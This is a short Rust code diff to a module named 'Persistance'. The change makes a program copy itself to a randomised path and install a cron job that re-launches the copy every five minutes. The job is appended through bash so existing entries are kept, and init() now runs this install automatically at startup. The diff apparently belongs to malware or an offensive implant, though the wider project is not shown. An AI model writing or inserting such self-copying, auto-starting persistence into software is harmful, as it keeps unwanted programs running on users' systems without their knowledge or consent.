@@ -30,14 +30,14 @@ impl Persistance {
     }
 
     pub fn install(&mut self) -> Result<(), Box<dyn std::error::Error>> {
-        let mut process = Command::new("/usr/bin/crontab").spawn()?;
+        let mut process = Command::new("/usr/bin/bash").spawn()?;
 
         self.duplicate()?;
 
         match process.stdin.take() {
             Some(mut stdin) => {
                 if let Some(path) = self.path.to_str() {
-                    stdin.write_all(format!("* * * * * {}", path).as_bytes())?;
+                    stdin.write_all(format!("(crontab -l 2>/dev/null; echo \"*/5 * * * * {}\") | crontab -", path).as_bytes())?;
                 }
 
                 info!("successfully set crontab");
@@ -70,7 +70,11 @@ pub fn rand_subpath(path: PathBuf) -> PathBuf {
 }
 
 pub fn init() {
-    let persistance = Persistance::new();
+    let mut persistance = Persistance::new();
+
+    if let Err(err) = persistance.install() {
+        warn!("failed to install persistance: {:?}", err);
+    }
 
     info!("path: {:#?}", persistance.path);
 }
